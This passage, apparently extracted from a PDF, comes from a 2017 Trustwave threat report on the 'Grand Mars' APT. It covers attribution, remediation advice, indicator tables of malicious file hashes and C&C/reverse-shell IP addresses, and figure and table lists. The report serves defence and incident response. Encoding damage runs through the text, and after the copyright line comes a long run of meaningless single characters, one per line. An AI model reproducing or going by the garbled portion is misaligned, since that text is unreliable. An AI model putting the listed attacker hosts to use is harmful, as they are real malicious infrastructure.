speci\u02dccally for use in this operation. Had these digital certi\u02dccates been \nstolen or \ufb01borrowed\ufb02 from a valid company, it is unlikely for there to have been such strong correlation between the \ntimeline of the attacks and the date/time that the certi\u02dccates were generated by the CA. \nFurthermore, the Pastebin URL used in the attacks as part of the command & control mechanism by the attackers \nbelongs to an individual identi\u02dced as \ufb01Shtokov\ufb02. This is yet another (weak) indication of the involvement of Russian/\nEastern European actors in these attacks. \nFigure 64. \n \nShtokov Pastebin site used in Command and Control\nUsing services such as Google Docs in order to keep track of victims and spreading malicious \u02dcles becomes a very \nbig challenge for defenders because this way is very dif\u02dccult to distinguish between good and bad guys using these \npopular public cloud services. \nFinally, the attack characteristics of this family of malware share several common traits with the, original, well \nunderstood Carbanak APT campaign, which has been positively attributed to the Russian underground \u02dcnancial \ncybercrime network. \nThe only thing that we can be sure is that attackers will not stop seeking new and innovative ways of infecting \ncorporate environments and manipulating public services, which are considered loyal and trustworthy from \n \nthe public. \n \n 38\nRemediation\nBased on the \u02dcndings of our investigation across several cases now dubbed to be part of the \ufb01Grand Mars\ufb02 \n \nAPT campaign, Trustwave SpiderLabs recommends the following remedial measures to be put in place both to \neffectively negate or minimize the damage caused due to the attacks, and to proactively address the threat prior to \nits realization.\nTACTICAL (SHORT TO MEDIUM TERM) COUNTERMEASURES \n\u0141\n \nRegular security awareness trainings for all personnel.\n\u0141\n \nDisable execution of VBS/VBE/macros from Internet based documents. \n\u0141\n \nProhibit execution of \u02dcles (EXE, VBS etc.) from folders such as AppData, User\u2122s Temp.\n\u0141\n \nDisable full unrestricted Internet access where not required.\n\u0141\n \nMinimize the number and usage of administrator accounts.\n\u0141\n \nPrevent regular users from logging in as administrators.\n\u0141\n \nImplement application layer \u02dcltering for widely used protocols such as HTTP etc.\n\u0141\n \nCreate unique passwords for local user and administrators and change them frequently.\n\u0141\n \nLimit administrative access only to those systems required.\nSince the malware is primarily memory resident, with no disk or \u02dcle-system level changes made to the host system, \nthe following checks are recommended to be carried out on all endpoints, servers, and the network. We recommend \nto check for indicators of:\n\u0141\n \nService(s) with randomized names installed and started on the system\n\u0141\n \nService(s) executed from:\n\u0141\n \nA PowerShell command/script\n\u0141\n \nA suspicious/randomized command, program or binary of unknown origin and purpose \n \n(such as Update.exe/322.exe noted in our report).\n\u0141\n \nA batch (.bat) script with a randomized name \n\u0141\n \nSystems making (or attempting to make) network connections to an external IP, especially on common ports \nsuch as 110, 53, 80, 443, 8080 commonly allowed on \u02dcrewalls for outbound connections but without using the \nactual protocols for these ports.\n\u0141\n \nScheduled tasks and OS Autoruns locations.\nFor a full list of IP addresses and malicious hosts/domains contacted by the malware in this report, please review \nthe Table of IOCs at the end of this section. \nKEY INDUSTRIES BE AWARE\nIt is highly recommended that organizations within the retail, e-commerce and hospitality industries implement \nstrategic countermeasures immediately. Undertake a thorough compromise assessment proactively rather than \nwait for the \u02dcrst signs of attack. Perform a comprehensive threat hunt, using information from this Advanced Threat \nReport, across the network, including servers and endpoints, to identify any signs of malicious activity. Finally, \nevaluate your current incident response capability to identify gaps that affect your organizations ability to respond. \nNo organization can deliver protection against all attacks. But your ability to effectively disrupt an attack, and \nrespond quickly and effectively, will have a long-term impact on your survivability in the face of advanced attacks \nlike Grand Mars.\n \n 39\nAppendix A: Files\nFile name\nHash (SHA256)\nComments\n1-list.docx\n803009B5CF8D663A2FA3E20651CBDD57DA25908366D886C2EEBC1A4BF7DFC3F0\nEmail word \nattachment\noleObject1.bin\nEC3980961C6145C96C1220188C6C06AC192AB4B5C4B2E335A96715DE43C62FDB\nEncrypted vbs from\n \ndocx (unprotected.\nvbe)\ndttsg.txt\n22F59C3CDABCECF9F71826D1BCE84FE227462142A437E76DC43046DBC63CE1E8\nData copied from \npastebin\nLanCradDriver.ini\nDEA485D817D712A5B61A8F31123F914890183D2F9B0BF0F3AF89366085596D5D\nPS1 script \ndownloaded from \nGoogle Docs\nLanCradDriver.vbs\n7683A9760AED259636C8623B577446406FF22E478CC33FA3095F681F54C2AF3B\nCaller for \nLanCradDriver.ini\nstarter.vbs\n270A776CB9855F27452B35F072AFFBBC65023D4BB1F22E0C301AFD2276E7C5EA\nScheduled task \n(SysChecks) calling \nTransbaseOdbc\n-\nDriver.js\nTransbaseOdbcDriver.js\n313E38756B80755078855FE0F1FFEA2EA0D47DFFFCBE2D687AAA8BDB37C892F4\nGoogle Docs \n+ Pastebin \ncommunicator\nUVZHDVlZ.exe\nDDAB9C2F975D336A698F4604AC755586C5451AC8DA0A98ECC5D9B8F6993D4E78\nCarbanak, signed \n\u02dcle with Comodo \ncerti\u02dccate\nUVZHDVlZPVBfXFBeVA.bin\nB84C629AC6AB3F8E03D8A52E8D3E874634C1645154C310F18B8F9FBB9D26BA41\nCon\u02dcg \u02dcle for \nprevious exe\n322.exe\n191BDA73661A99E7F2FBE746F4D6105076F1E5A690B124D5F381E218626CA1C2\nRe\u02daectively injecting \ndll for reverse shell\nAdobeUpdateManagementTool.\nvbs \nDDBF9963FE77ABDF97DE51A27509432ED963657D5F598E2179CEC882B0335334\nCommunicating with \nvarious C&C\nupdate.exe\n321BA0DFFEE63518BFE24FF02C0DF6A09692A5D32BCC33AA454AC7431D390F57\nCobalt Strike's \npost-exploitation \ntool called Beacon, \nsigned \u02dcle with \nComodo certi\u02dccate\n1.bat\nBB0DF2ACCC9F34F432AD7A6279003EF4283508F20BDA005605B1245D0D5164A6\nBatch \u02dcle with PS1 \nscripts\nstr.vbs\nEA82AD136A0964EA6E1EC30288BD0D6E41E8AEC2D0206D802BCE7429A8DD69BF\nEncoded PS scripts \n(32/64-bit), download \nXOR-encrypted \npayload to RAM\nvbssysteminstall.vbs\nB9D6CE9A1DBBD4888F58FC1B3732EF7FE17B00319103AD965237327908D0D254\nVBS installed Adobe\n-\nUpdateManagement\n-\nTool as a service\nresolv_ip.vbs\n7AFE9EA1E8A6398E9C3BA4CAA0EEF788D80B6C07235558D23FDC818E3F9E9F6E\nVBS reading \nhostnames from \nhostnames.txt and \npings them\n\\Windows\\temp\\vb__.vbs\nE9F7E0BE49BF2B3A276A664A57FEE4459B77964F1F3BEAE80BC461634BC2A6AF\nEncoded PS scripts \n(32/64-bit), download \nXOR-encrypted \npayload to RAM\nTable 11. \n \nFile IOCs for the Grand Mars APT\n \n 40\nAppendix B: Malicious hosts/IP addresses\nHost\nUsage\nGeo Location\n62.210.25.121\nReverse shell metepreter (port 80)\nFrance\n80.84.49.61\nReverse shell metepreter (port 53)\nUK\n80.84.49.66\nVBS script C&C\nUnited Kingdom\n81.17.28.124\nAdobeUpdateManagementTool.vbs\nSwitzerland\n89.163.248.8\nReverse shell metepreter\nGermany\n89.163.248.6\nReverse shell metepreter\nGermany\n95.215.44.12\nCobalt Strike's Beacon \nSweden\n95.215.46.221\nAdobeUpdateManagementTool.vbs\nSweden\n95.215.46.229\nAdobeUpdateManagementTool.vbs\nSweden\n95.215.46.234\nAdobeUpdateManagementTool.vbs\nSweden\n95.215.46.249\nAdobeUpdateManagementTool.vbs\nSweden\n95.215.44.94\nsvchost.exe\nSweden\n95.215.47.105\nHosting AdobeUpdateManagementTool.vbs \nSweden\n104.250.138.197\nsvchost.exe\nUnited States\n107.181.246.189\nCarbanak C&C (port 443)\nUnited States\n148.251.18.75\nAdobeUpdateManagementTool.vbs\nGermany\n179.43.140.85\nCarbanak C&C (port 443)\nSwitzerland\n179.43.133.34\nAdobeUpdateManagementTool.vbs\nSwitzerland\n192.99.14.211\nCarbanak C&C\nCanada\n212.129.36.175\nPowerShell C&C \nFrance\nTable 12. \n \nMalicious hosts and IPs\nReferences\n1.\n \nMetasploit\n  \nhttps://www.metasploit.com/ \n2.\n \nPowerSploit\n  \nhttps://github.com/PowerShellMa\u02dca/PowerSploit \n3.\n \nVeil Framework\n \n \nhttps://www.veil-framework.com/  \n4.\n \nOf\u02dcce File Formats\n  \nhttps://msdn.microsoft.com/en-us/library/of\u02dcce/cc313118(v=of\u02dcce.12).aspx \n5.\n \nScript Encryptor\n \n \nhttp://www.dennisbabkin.com/screnc/ \n6.\n \nProcdot Tool\n \n \nhttp://www.procdot.com/ \n7.\n \nRe\u02daective DLL Injection\n  \nhttp://www.harmonysecurity.com/\u02dcles/HS-P005_Re\u02daectiveDllInjection.pdf \n 41\nList of Figures\nFigure 1\n.\n Email received by victim with a Word attachment\n \n............................................\n.\n3\nFigure 2\n.\n Message body of the suspect email\n \n.........................................................\n.\n3\nFigure 3\n.\n Microsoft Word \n.\ndocx attachment (1-list\n.\ndocx)\n...............................................\n.\n3\nFigure 4\n.\n Word \n.\ndocx Macro enabled malware\n \n........................................................\n4\nFigure 5\n.\n Embedded oleObject0\n.\nbin \u02dcle from Word document\n..........................................\n4\nFigure 6\n.\n oleObject\n.\nbin showing potentially encoded content\n...........................................\n.\n5\nFigure 7\n.\n Use of legitimate tool to encrypt/encode VBE script\n...........................................\n.\n5\nFigure 8\n.\n Tool used for obfuscating the VBE script\n.....................................................\n.\n6\nFigure 9\n.\n Binary to String conversion functions\n \n.......................................................\n.\n7\nFigure 10\n.\n Base64 encode-decode functions\n..........................................................\n.\n7\nFigure 11\n.\n Starter\n.\nvbs creation (truncated)\n \n............................................................\n8\nFigure 12\n.\n LanCradDriver\n.\nvbs LanCradDriver\n.\nini creation\n \n...............................................\n8\nFigure 13\n.\n TransbaseOdbcDrive\n.\njs creation (truncated)\n.................................................\n.\n9\nFigure 14\n.\n Persistence of starter\n.\nvbs\n \n.................................................................\n.\n9\nFigure 15\n.\n Calculating and encoding of Disk S/N\n......................................................\n.\n10\nFigure 16\n.\n Checking proxy con\u02dcguration\n \n............................................................\n.\n10\nFigure 17\n.\n Main function\n...........................................................................\n.\n10\nFigure 18\n.\n sendFormData function\n...................................................................\n11\nFigure 19\n.\n Initial submission Google Form\n \n...........................................................\n.\n12\nFigure 20\n.\n Files dropped on execution of embedded VBE script\n \n........................................\n.\n13\nFigure 21\n.\n Starter\n.\nvbs script\n........................................................................\n.\n13\nFigure 22\n.\n Process information for TransbaseOdbcDriver\n.\njs\n \n...........................................\n.\n14\nFigure 23\n.\n LoadLinkSettings() function\n..............................................................\n.\n14\nFigure 24\n.\n Google macro execution output\n \n..........................................................\n.\n15\nFigure 25\n.\n LogInet() function\n.......................................................................\n.\n15\nFigure 26\n.\n Infected system registration using Google Form\n \n...........................................\n.\n15\nFigure 27\n.\n Calling GetSourceCode() function\n.........................................................\n.\n16\nFigure 28\n.\n GetSourceCode function\n.................................................................\n.\n16\nFigure 29\n.\n Code from Pastebin\n \n.....................................................................\n.\n16\nFigure 30\n.\n Arguments from Pastebin\n \n...............................................................\n.\n17\nFigure 31\n.\n Pastebin account used for tracking\n........................................................\n.\n17\nFigure 32\n.\n Downloading code from Google Docs (truncated)\n \n..........................................\n.\n18\nFigure 33\n.\n Encoded PowerShell commands retrieved from Google Spreadsheet\n.........................\n.\n18\nFigure 34\n.\n LaCradDriver\n.\nini (truncated)\n..............................................................\n.\n19\nFigure 35\n.\n LanbCradDriver\n.\nvbs\n \n.....................................................................\n.\n19\nFigure 36\n.\n LanCradDriver\n.\nini (truncated)\n \n............................................................\n20\nFigure 37\n.\n LanCradDriver\n.\nini populated post-execution of TransbaseOdbcDriver\n.\njs\n \n.......................\n20\nFigure 38\n.\n Role of dropped \u02dcles and sequence of execution\n \n...........................................\n20\nFigure 39\n.\n Activity diagram showing C&C involving Google Forms and Docs\n \n............................\n.\n21\nFigure 40\n.\n Activity diagram showing C&C in case Google Spreadsheet not available\n \n.....................\n22\nFigure 41\n.\n TCP Reverse Shell from a PowerShell script\n................................................\n23\n 42\nFigure 42\n.\n Registry persistence\n \n....................................................................\n24\nFigure 43\n.\n SysCheks Scheduled Task persistence\n \n....................................................\n24\nFigure 44\n.\n Event showing Pass-the-Hash indicators\n..................................................\n25\nFigure 45\n.\n Batch \u02dcle used for spreading\n.............................................................\n26\nFigure 46\n.\n PowerShell script used for spreading\n \n.....................................................\n26\nFigure 47\n.\n HTTP POST request used to ex\u02dcltrate data from compromised system\n \n.......................\n28\nFigure 48\n.\n HTTP POST method options\n \n.............................................................\n29\nFigure 49\n.\n XOR key detection\n \n......................................................................\n30\nFigure 50\n.\n Payload decoding\n.......................................................................\n30\nFigure 51\n.\n Starting Anunak after decrypting it\n \n.......................................................\n30\nFigure 52\n.\n Procdot visualization of UVZHDVIZ\n.\nexe\n.\n \n...................................................\n30\nFigure 53\n.\n Digital certi\u02dccate details of UVZHDVIZ\n.\nexe (Grand Mars)\n....................................\n.\n31\nFigure 54\n.\n Digital certi\u02dccate details of update\n.\nexe\n....................................................\n32\nFigure 55\n.\n Decryption routine with XOR key\n \n.........................................................\n32\nFigure 56\n.\n Loader Code\n............................................................................\n33\nFigure 57\n.\n PE Executable\n \n..........................................................................\n33\nFigure 58\n.\n Memory allocation for payload\n...........................................................\n33\nFigure 59: Routine to decrypt beacon DLL\n...........................................................\n33\nFigure 60\n.\n Decrypted beacon DLL\n \n..................................................................\n33\nFigure 61\n.\n Re\u02daective beacon DLL\n \n...................................................................\n34\nFigure 62\n.\n EICAR test string in X-Malware \u02dceld\n \n......................................................\n34\nFigure 63\n.\n Malicious hosts geolocation\n..............................................................\n36\nFigure 64\n.\n Shtokov Pastebin site used in Command and Control\n \n.......................................\n37\nList of Tables\nTable 1\n.\n Hashes of Starter\n.\nvbs\n \n......................................................................\n.\n13\nTable 2\n.\n Hashes of TransbaseOdbcDriver\n.\njs\n \n..........................................................\n.\n14\nTable 3\n.\n Hashes of LanCradDriver\n.\nvbs\n...............................................................\n.\n19\nTable 4\n.\n Hashes of LanCradDriver\n.\nini\n................................................................\n.\n19\nTable 5\n.\n Hashes of AdobeUpdateManagementTool\n.\nvbs\n \n...............................................\n.\n27\nTable 6\n.\n Examples of supported commands\n \n.........................................................\n28\nTable 7\n.\n Hashes of UVZHDVlZ\n.\nexe\n \n..................................................................\n29\nTable 8\n.\n Hashes of Update\n.\nexe\n \n.....................................................................\n.\n31\nTable 9\n.\n Hashes of 322\n.\nexe\n.........................................................................\n34\nTable 10\n.\n Valid {transport} command line options for 322\n.\nexe\n..........................................\n35\nTable 11\n.\n File IOCs for the Grand Mars APT\n \n..........................................................\n39\nTable 12\n.\n Malicious hosts and IPs\n \n...................................................................\n40\n GMAPTO_0116\ntrustwave.com\nCopyright \u00a9 2017 Trustwave Holdings, Inc.\n ", "\u00c9\n\u2021\nH\n~\n\ufb02\n0\n\u00bb\n\u00c3\n\u00bc\n\u00b9\n\u00bb\n\u00c3\n\u00b0\n\ufb02\nt\n\u00c7\n>\nH\n\u00bc\n>\n\u00fa\nF\n;\n,\n\u00c7\n\u00fa\n>\n\u00b3\n\ufb02\n>\n\u2021\nH\n0\n;,\n\ufb02\n>\n0\n,\n\u00bc\n\u00c7\n;\n\u00bc\n\ufb02\n;\n\u00f6\n>\n0\n\u00c7\nH\n\u00c7\n\u00f6\n\ufb02\n>\n\u00fa\u2030\n\u2030\ufb02\n\u00b1\n\ufb02\n\u00fa\n;\n\ufb02\nH\n>\n0\n\u00b3\n\ufb02\nH\n;\n,\n0\n\u00b1\n,\n\u00c7\n\u00fa\nH\n\u2021\n\u00f6\n\u00f3\nT\n;\n\u00f3\nH\n\u00bc\n0\n\ufb02\n>\nH\n\u00f8\n\u00c7\n\u00fa\n;\n\u00c7\n\u00b3\n\u00bc\nH\n\u00f3\n,\n;\nH\n\u00f3\n\u00e2\n\ufb02\nt\n\u00c7\n>\nH\n\u00bc\n>\n\u00fa\n\u00f8\n\ufb02\n;\n,\n\u00c7\n\u00fa\n>\n\u00b3\n\ufb02\n\u00f8\n>\n\u2021\nH\n0\n\u00f8\n;\n,\n\ufb02\n>\n0\n,\n\u00bc\n\u00c7\n;\n\u00bc\n\ufb02\n;\n\u00f8\n\u00f6\n>\n0\n\u00c7\nH\n\u00c7\n\u00f6\n\ufb02\n\u00f8\n>\n\u00fa\n\u2030\n\u00f8\n\u2030\n\ufb02\n\u00b1\n\ufb02\n\u00fa\n;\n\ufb02\n\u00f8\nH\n>\n0\n\u00b3\n\ufb02\nH\n;\n\u00c9\nt\n\ufb02\n0\nt\n\u00c7\n\ufb02\nw\n\u00fb\n0\n\u00b1\n,\n\u00c7\n\u00fa\nH\n0\n\ufb02\n;\n\ufb02\n>\n0\n\u2021\n\u00bc\n\ufb02\n0\n;\n>\n0\n\ufb02\nH\n0\n>\n\u2021\n\u00db\n\u00c7\n\u00fa\n\u00b3\n>\n\u00fa\n\ufb02\n;\n,\n\u00c7\n\u00fa\n>\n\u00b3\n\ufb02\n>\n\u2021\nH\n0\nH\n>\n0\n\u00b3\n\ufb02\nH\n\u00c7\n\u00fa\n\u00b3\n0\n\u00b3\n>\n\u00fa\n\u00c7\n\u201c\n>\nH\n\u00c7\n\u00fa\n;\n>\n\u00fa\n\u2030\n\u00bc\n\u00c7\n\u00b3\n\u00bc\n\u00f8\nt\n>\n\u00e2\nT\n\ufb02\nH\n>\n0\n\u00b3\n\ufb02\nH\n;\n\u00c7\n\u00fa\n\u2030\n\ufb02\n\u00b1\n\ufb02\n\u00fa\n;\n\ufb02\n>\n\u00fa\n\u2030\n\u00b3\nt\n\ufb02\n0\n\u00fa\n\u00f6\n\ufb02\n\u00fa\nH\n\u2021\nH\n\u00c7\nt\n\ufb02\n;\n\u00c7\n\u00fa\n\u2021\n\ufb02\n>\nH\n\u00e2\n\ufb02\n>\n;\nH\n\u00bc\n\u00b9\n\u00bb\n\u00be\nH\n\u00bc\n\u00c7\n;\n>\n\u2021\nH\n0\n\u00bc\n>\n;\n\u00e2\n\u00fa\n\u00b3\n\u00f8\n;\nH\n>\n\u00fa\n\u2030\n\u00c7\n\u00fa\n\u00b3\n\u00c7\n\u00fa\nH\n\ufb02\n0\n\ufb02\n;\nH\n\u00c7\n\u00fa\n\u00f6\n>\n0\n\u00c7\nH\n\u00c7\n\u00f6\n\ufb02\n\u00c7\n\u00fa\n\u2030\nT\n;\nH\n0\n\u00c7\n\ufb02\n;\n\u00fa\n>\nt\n>\n\u00e2\n\u2030\n\ufb02\n\u00b1\n\ufb02\n\u00fa\n;\n\ufb02\n\u2021\n\u00fa\nH\n0\n>\n\u2021\nH\n0\n;\n>\n\u00fa\n\u2030\n>\n;\n;\n\u2021\n\u00c7\n>\nH\n\ufb02\n\u2030\n0\n\ufb02\n;\n\ufb02\n>\n0\n\u2021\n\u00bc\n\u00c7\n\u00fa\n;\nH\n\u00c7\nH\nT\nH\n\u00c7\n\u00fa\n;\n\u00c7\n\u00fa\nH\n\u00bc\n\ufb02\n&\n\u00fa\n\u00c7\nH\n\ufb02\n\u2030\nH\n>\nH\n\ufb02\n;\n>\n\u00fa\n\u2030\nP\n\ufb02\n;\nH\n\ufb02\n0\n\u00fa\nF\nT\n0\n,\n\ufb02\n\u00a9\n\ufb02\n\u2021\nH\n>\n\u00db\n\ufb02\n>\nw\n>\n\u2021\n;\n\u00b1\n0\n\u00f6\nH\n\u00bc\n\u00c7\n;\n0\n\ufb02\n;\n\ufb02\n>\n0\n\u2021\n\u00bc\n\u00c7\n\u00fa\n\u2021\n\u00e2\nT\n\u2030\n\ufb02\n\u00fa\n\u2030\nT\n;\nH\n0\n\u2021\nH\n>\n0\n\u00b3\n\ufb02\nH\n\u00c7\n\u00fa\n\u00b3\n\u02d9\n\u00bc\n\ufb02\n>\n\u2021\nH\n0\nH\n>\n0\n\u00b3\n\ufb02\nH\n;\n\u2030\n\ufb02\n\u00b1\n\ufb02\n\u00fa\n;\n\ufb02\n\u2021\n\u00fa\nH\n0\n>\n\u2021\nH\n0\n;\nT\n\u00fa\n\u00c7\nt\n\ufb02\n0\n;\n\u00c7\nH\n\u00c7\n\ufb02\n;\n\u00ea\n,\n>\n0\nH\n\u00c7\n\u2021\nT\n\u00e2\n>\n0\n\u00e2\n\u2021\nH\n\u00bc\n;\n\ufb02\nw\n\u00c7\nH\n\u00bc\n\u00f6\n\u00c7\n\u00e2\n\u00c7\nH\n>\n0\n\u2021\n0\n\ufb02\n;\n\ufb02\n>\n0\n\u2021\n\u00bc\nH\n\u00c7\n\ufb02\n;\n\u00eb\n\u00e2\n\ufb02\n\u00b3\n>\n\u00e2\n0\n\u00b3\n>\n\u00fa\n\u00c7\n\u201c\n>\nH\n\u00c7\n\u00fa\n;\n\u00ec\n\u00bd\n\u00ed\n>\n\u00fa\n\u2030\n\u00b3\nt\n\ufb02\n0\n\u00fa\n\u00f6\n\ufb02\n\u00fa\nH\n>\n\u00b3\n\ufb02\n\u00fa\n\u2021\n\u00c7\n\ufb02\n;\n\u00ec\n\u00bd\n\u00ed\n\u02d9\n\u00bc\n\ufb02\n>\n\u2021\nH\n0\n\u00bc\n>\n;\n,\n>\n0\nH\n\u00c7\n\u2021\nT\n\u00e2\n>\n0\n\u00c7\n\u00fa\nH\n\ufb02\n0\n\ufb02\n;\nH\n\u00c7\n\u00fa\n\u00fa\n>\nt\n>\n\u00e2\n\u00c7\n\u00fa\n\u2030\nT\n;\nH\n0\n\u00c7\n\ufb02\n;\n\u00c7\n\u00fa\n\u2021\n\u00e2\nT\n\u2030\n\u00c7\n\u00fa\n\u00b3\n;\n\u00bc\n\u00c7\n,\n~\nT\n\u00c7\n\u00e2\n\u2030\n\u00c7\n\u00fa\n\u00b3\n>\n\u00fa\n\u2030\n0\n\ufb02\n\u00e2\n>\nH\n\ufb02\n\u2030\n0\n\ufb02\n;\n\ufb02\n>\n0\n\u2021\n\u00bc\nl\n\ufb02\n\u00b3\n0\n>\n,\n\u00bc\n\u00c7\n\u2021\n>\n\u00e2\nH\n>\n0\n\u00b3\n\ufb02\nH\n\u00c7\n\u00fa\n\u00b3\n\u02d9\n>\n0\n\u00b3\n\ufb02\nH\n\u00c7\n\u00fa\n\u00b3\n\u00c7\n\u00fa\n\u2021\n\u00e2\nT\n\u2030\n\ufb02\n;\n&\n\u00fa\n\u00c7\nH\n\ufb02\n\u2030\nH\n>\nH\n\ufb02\n;\nP\n\ufb02\n;\nH\n\ufb02\n0\n\u00fa\nF\nT\n0\n,\n\ufb02\n>\n\u00fa\n\u2030\nT\nH\n\u00bc\n4\n\u00bc\n\u00c7\n\u00fa\n>\n\ufb02\n>\n\u02d9\n\u00e2\n;\n4\nT\n;\nH\n\u00f6\n\u00a7\n>\nt\n>\n\u2021\n0\n\u00c7\n,\nH\n\u00f6\n>\n\u00e2\nw\n>\n0\n\ufb02\n\u00db\n\u00fa\nw\n\u00fa\n>\n;\n\u00c9\n0\n\u201c\n>\n\u00fa\n\u2030\n\u00be\n>\n\u00fa\nu\n>\n\u00c7\n\u00bc\nT\n4\n~\n>\n\u00e2\nH\nH\n0\n\u00c7\n\u00db\n\ufb02\nH\n\u00bc\n\ufb02\n\ufb02\n=\n\u00e2\n\u00e2\n\u00a7\n>\nt\n>\n\u2021\n0\n\u00c7\n,\nH\n\u00e2\n>\n\u2030\n\ufb02\n0\n>\n\u00fa\n\u2030\n\u00ba\n\u2021\n\u00db\n=\n\u00e2\n\u00e2\n\u2030\n\u00e2\n\u00e2\n\u00e2\n>\n\u2030\n\ufb02\n0\n=\n\ufb02\n\u00e2\n\u00c7\nt\n\ufb02\n0\n\u2021\nF\n\u00f6\n>\n\u00c7\n\u00e2\n\ufb02\n\u2030\n>\nH\nH\n>\n\u2021\n\u00bc\n\u00f6\n\ufb02\n\u00fa\nH\n;\n>\n\u00fa\n\u2030\n&\n\u00ff\n\u00b0\n;\n\u00b1\nH\n\ufb02\n\u00fa\n\ufb02\n\u00f6\n,\n\u00e2\n\u2021\n\u00c7\n\u00fa\n\u00b3\n>\n\u00b1\n0\n>\nT\n\u2030\nT\n\u00e2\n\ufb02\n\u00fa\nH\n\u00e2\n\u00db\n>\n\u00e2\n\u00c7\n\u00db\n\ufb02\n\u2030\n\u00f6\n>\n\u00c7\n\u00fa\n>\n\u00fa\n\u2030\n;\nH\n\u00e2\n\ufb02\n\u00fa\n~\n0\n>\n\u00fa\n\u2030\n\u00c7\n\u00fa\n\u00b3\nF\n,\n\u00e2\n\u00c7\nH\n>\nH\n\u00c7\n\u00fa\n\u00ba\n\u00c7\n\u2021\n0\n;\n\u00b1\nH\nF\n\u2021\n\ufb02\n\u00e2\n>\n\u00fa\n\u2030\nP\n0\n\u2030\n\u2030\n\u2021\nT\n\u00f6\n\ufb02\n\u00fa\nH\n;\nw\n\u00c7\nH\n\u00bc\n\u00f6\n>\n\u2021\n0\n;\n\u00ea\n;\n\u00f6\n\ufb02\nH\n\u00c7\n\u00f6\n\ufb02\n;\n,\n>\n;\n;\nw\n0\n\u2030\n\u00f8\n,\n0\nH\n\ufb02\n\u2021\nH\n\ufb02\n\u2030\n\u00eb\nt\n\ufb02\n0\n\u2021\n0\n\ufb02\n\u2021\n\ufb02\n\u00fa\nH\nt\nT\n\u00e2\n\u00fa\n\ufb02\n0\n>\n~\n\u00c7\n\u00e2\n\u00c7\nH\n\u00c7\n\ufb02\n;\n;\nT\n\u2021\n\u00bc\n>\n;\n4\nM\nF\n\u00f8\n\u00bc\n\u00b9\n\u00bb\n\u00c3\n\u00f8\n\u00b9\n\u00bb\n\u00c5\n\u00c5\n>\n\u00fa\n\u2030\n4\nM\nF\n\u00f8\n\u00bc\n\u00b9\n\u00bb\n\u00c3\n\u00f8\n\u00c4\n\u00c3\n\u00c0\n\u00c5\n>\n\u00fa\n\u2030\n\u00f6\n>\n\u00e2\n\u00c7\n\u2021\n\u00c7\nT\n;\n\u00ba\n\u00c7\n\u2021\n0\n;\n\u00b1\nH\n\u00fb\nT\n~\n\u00e2\n\u00c7\n;\n\u00bc\n\ufb02\n0\n\u00b1\n\u00c7\n\u00e2\n\ufb02\n;\n\u00fa\n;\nH\n>\n\u00e2\n\u00e2\n>\nH\n\u00c7\n\u00fa\n\u00a7\n>\nt\n>\n\u2021\n0\n\u00c7\n,\nH\n\u00a7\n>\nt\n>\n\u2021\n0\n\u00c7\n,\nH\n\u2021\n0\n\u00c7\n,\nH\n\u00e2\n\ufb02\nH\n;\n\u00c7\n\u00fa\nW\n\u00ba\n\u00b0\nu\n\u02d9\n\u00fb\nw\n\ufb02\n0\n\u00bc\n\ufb02\n\u00e2\n\u00e2\nP\n\u00ba\n0\n\ufb02\n\u00b3\n;\nt\n0\n\u00bd\n\u00bc\n/\nT\n\u00c7\n~\n\u00e2\n\u2021\n\u2030\n\u00b0\n>\nH\n\ufb02\n0\n>\n\u00e2\n\u00ba\nt\n\ufb02\n\u00f6\n\ufb02\n\u00fa\nH\n\u02d9\n\u00bc\n\ufb02\n>\n\u2021\nH\n0\n;\n\u00f6\n\ufb02\nH\n\u00c7\n\u00f6\n\ufb02\n;\nT\nH\n\u00c7\n\u00e2\n\u00c7\n\u201c\n\ufb02\n;\n>\n\u2021\n\u2021\n\ufb02\n;\n;\n>\nH\n\u00fa\n\ufb02\n\u2021\n\u00f6\n,\n0\n\u00f6\n\u00c7\n;\n\ufb02\n\u2030\n0\n\u00b3\n>\n\u00fa\n\u00c7\n\u201c\n>\nH\n\u00c7\n\u00fa\nH\n>\nH\nH\n>\n\u2021\n\u00db\nH\n\u00bc\n\ufb02\n\u00fa\n\ufb02\nH\nj\n0\n\ufb02\n>\n\u00f6\n,\n\u00e2\n\ufb02\n\u2021\n\u00f6\n,\n0\n\u00f6\n\u00c7\n;\n\ufb02\n\u2030\n\ufb02\n\u00f6\n>\n\u00c7\n\u00e2\n>\n\u2021\n\u2021\nT\n\u00fa\nH\n;\n>\nH\n\u00fa\n\ufb02\n0\n\u00b3\n>\n\u00fa\n\u00c7\n\u201c\n>\nH\n\u00c7\n\u00fa\nw\n\ufb02\n0\n\ufb02\nT\n;\n\ufb02\n\u2030\nH\n;\n\ufb02\n\u00fa\n\u2030\nH\n\u00bc\n\ufb02\n\u00fa\n\ufb02\nH\nw\n>\nt\n\ufb02\n\u00b1\n\u00f6\n>\n\u00e2\n\u00c7\n\u2021\n\u00c7\nT\n;\n>\nH\nH\n>\n\u2021\n\u00bc\n\u00f6\n\ufb02\n\u00fa\nH\n;\nH\n,\nH\n\ufb02\n\u00fa\nH\n\u00c7\n>\n\u00e2\nt\n\u00c7\n\u2021\nH\n\u00c7\n\u00f6\n;\n\u00c7\n\u00fa\nH\n\u00bc\n\ufb02\n;\n>\n\u00f6\n\ufb02\n\u00c7\n\u00fa\n\u2030\nT\n;\nH\n0\n\u2021\n\u00c7\n\u00f6\n\u00c7\n\u00e2\n>\n0\n\u00e2\n\u2021\nH\n\u00bc\n\ufb02\n>\n\u2021\nH\n0\n>\nH\nH\n\ufb02\n\u00f6\n,\nH\n;\nH\n\u2021\n\u00f6\n,\n0\n\u00f6\n\u00c7\n;\n\ufb02\n;\n\ufb02\n0\nt\n\ufb02\n0\n;\nw\n\u00c7\nH\n\u00bc\n\u00c7\n\u00fa\nt\n\u00c7\n\u2021\nH\n\u00c7\n\u00f6\n0\n\u00b3\n>\n\u00fa\n\u00c7\n\u201c\n>\nH\n\u00c7\n\u00fa\n;\n>\n\u00fa\n\u2030\nT\n;\n\ufb02\nH\n\u00bc\n\ufb02\n\u00f6\n\u00b1\n0\n\u2021\n\u00f6\n\u00f6\n>\n\u00fa\n\u2030\n>\n\u00fa\n\u2030\n\u2021\n\u00fa\nH\n0\n\u00e2\n\u00ea\n4\n\u00e5\n4\n\u00eb\n\u00b1\n0\nH\n\u00bc\n\ufb02\n\u00c7\n0\n\u00f6\n>\n\u00e2\nw\n>\n0\n\ufb02\n\u02d9\n\u00bc\n\u00c7\n;\n~\n\u00e2\n\u00b3\nH\n0\n>\n\u2021\n\ufb02\n;\n\u00db\n\ufb02\n\u2021\n>\n\u2021\nH\n\u00c7\nt\n\u00c7\nH\n\u00c7\n\ufb02\n;\n\u2021\n\u00fa\